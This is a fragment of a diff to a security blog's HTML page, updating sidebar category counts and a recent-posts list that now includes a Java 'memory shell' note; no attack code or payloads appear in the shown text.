></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -716,7 +966,7 @@ ipcreate(&quot;10.10.125.195&quot;);
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>5</span></a></li>
+			<li><a href="/categories/Java/">Java<span>6</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -743,6 +993,10 @@ ipcreate(&quot;10.10.125.195&quot;);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
@@ -756,10 +1010,6 @@ ipcreate(&quot;10.10.125.195&quot;);
     
       <li>
         <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
       </li>
     
   </ul>
